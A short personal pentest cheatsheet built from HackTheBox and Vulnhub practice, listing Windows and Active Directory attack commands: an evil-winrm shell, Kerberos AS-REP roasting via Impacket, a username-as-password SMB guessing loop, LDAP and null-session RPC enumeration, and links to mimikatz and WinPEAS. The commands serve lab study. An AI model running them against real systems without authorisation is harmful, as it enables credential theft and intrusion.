# pentest cheatsheet

> personal cheathsheet populated via my [HTB](https://www.hackthebox.eu/) and [Vulnhub](https://www.vulnhub.com/) experience.

## Windows

- Get a shell:```evil-winrm -i <ip> -u <username> -p <password>```

### Tools

- [LOLBAS](https://lolbas-project.github.io/#) _(GTFOBins version Windows)_
	+ [GTFOBLookup](https://github.com/nccgroup/GTFOBLookup): offline command line lookup utility
- [PEASS - Privilege Escalation Awesome Scripts SUITE](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite#peass---privilege-escalation-awesome-scripts-suite)
	+ [WinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) _(Une sorte de LinEnum pour Windows)_
- [mimikatz](https://github.com/gentilkiwi/mimikatz#mimikatz)
- [dnSpy](https://github.com/0xd4d/dnSpy#dnspy---latest-release---%EF%B8%8F-donate): debugger and .NET assembly editor.
- [BloodHound](https://github.com/BloodHoundAD/Bloodhound/wiki): reveal the hidden and often unintended relationships within an Active Directory environment. 

### LDAP

- ```ldapsearch -h <IP> -x -s base namingcontexts``` 
- ```ldapsearch -h <IP> -x -b "<distinguishedName>" | grep "^dn"```

### Kerberos

- ```python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py <distinguishedName>/<username> -request -dc-ip <IP> [-no-pass -usersfile users.txt]```

### Samba

- ```smbclient -L //<IP>/<Sharename> -U "username%password"```
- ```for u in $(cat usernames.txt); do echo "User: $u"; smbclient -L //<IP>/ -U "$u%$u"; done```

### RPC

```bash
rpcclient -U "" $IP
<empty password>
rpcclient $> srvinfo       # identify the specific OS version
rpcclient $> enumdomusers  # display a list of users names defined on the server
rpcclient $> getdompwinfo  # get SMB password policy
rpcclient $> querydispinfo # get users info
```

## Linux

> **TODO**
